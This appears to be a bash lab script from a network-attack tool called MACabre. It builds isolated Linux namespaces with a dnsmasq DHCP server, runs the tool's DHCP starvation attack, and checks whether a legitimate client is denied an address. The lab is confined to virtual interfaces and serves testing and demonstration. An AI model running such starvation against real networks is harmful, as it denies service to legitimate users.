#!/usr/bin/env bash
# Isolated DHCP starvation lab (Linux only, needs root).
#
# Builds two network namespaces joined by a veth pair:
#   - "server":   dnsmasq acting as a DHCP server (pool of 20 addresses)
#   - "attacker": MACabre's DHCP starvation, with the full handshake
#                 (DISCOVER -> OFFER -> REQUEST)
#
# After the attack, a legitimate client sends one DISCOVER. If the pool is
# exhausted, dnsmasq does not offer an address to it.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_starvation_lab.sh            # 40 DISCOVER frames
#   sudo FRAMES=200 scripts/lab/dhcp_starvation_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv) with
# the package dependencies installed. Override with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
export FRAMES="${FRAMES:-40}"
POOL_SIZE=20
PROBE_MAC="02:00:00:00:00:99"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"
LEASES="$WORK/leases"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    ip netns del attacker 2>/dev/null || true
    ip netns del server 2>/dev/null || true
}

cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

# Remove leftovers from a previous interrupted run, without touching $WORK.
stop_lab

ip netns add server
ip netns add attacker
ip link add vs type veth peer name va
ip link set vs netns server
ip link set va netns attacker

ip netns exec server ip link set lo up
ip netns exec server ip addr add 10.99.0.1/24 dev vs
ip netns exec server ip link set vs up
ip netns exec attacker ip link set va up
# Promiscuous mode: the attacker must see OFFERs that the server may address
# to the client MAC rather than to broadcast.
ip netns exec attacker ip link set va promisc on

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=vs \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-authoritative \
    --no-ping \
    --dhcp-range=10.99.0.100,10.99.0.119,12h \
    --dhcp-leasefile="$LEASES" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

count_in_log() {
    local n
    n=$(grep -c "$1" "$LOG" 2>/dev/null || true)
    echo "${n:-0}"
}

# dnsmasq writes its log with some delay: wait until the count of the given
# message type stops changing.
wait_for_stable() {
    local pattern="$1" previous=-1 current stable=0
    for _ in $(seq 1 60); do
        current=$(count_in_log "$pattern")
        if [[ "$current" -eq "$previous" ]]; then
            stable=$((stable + 1))
            if [[ "$stable" -ge 3 ]]; then
                break
            fi
        else
            stable=0
        fi
        previous=$current
        sleep 1
    done
}

echo "Running starvation with $FRAMES DISCOVER frames (full handshake)..."
ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "
import os, threading
from macabre.attacks.dhcp_starvation import DhcpStarvationConfig, run_starvation
count = int(os.environ['FRAMES'])
stats = run_starvation(
    DhcpStarvationConfig(iface='va', count=count, interval=0.01),
    threading.Event(),
    lambda _: None,
)
print(f'Attacker: DISCOVER sent {stats.discovers}, OFFER answered {stats.offers}, REQUEST sent {stats.requests}')
"

wait_for_stable 'DHCPACK'

echo
echo "Server results (dnsmasq):"
echo "  DISCOVER received:       $(count_in_log 'DHCPDISCOVER')"
echo "  OFFER sent:              $(count_in_log 'DHCPOFFER')"
echo "  REQUEST received:        $(count_in_log 'DHCPREQUEST')"
echo "  ACK sent (leases):       $(count_in_log 'DHCPACK')"
echo "  distinct addresses:      $(grep -o 'DHCPACK(vs) 10\.99\.0\.[0-9]*' "$LOG" | sort -u | wc -l) of $POOL_SIZE"

# Legitimate client probe: a fresh MAC that has never asked for an address.
ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "
from scapy.all import sendp
from macabre.attacks.dhcp_starvation import build_discover
sendp(build_discover('$PROBE_MAC', 4242), iface='va', verbose=False)
"
sleep 3

echo
if grep -q "DHCPOFFER(vs) .* $PROBE_MAC" "$LOG"; then
    echo "Legitimate client probe: OFFER received. The pool is NOT exhausted."
else
    echo "Legitimate client probe: NO OFFER received. The pool is exhausted (DoS)."
fi
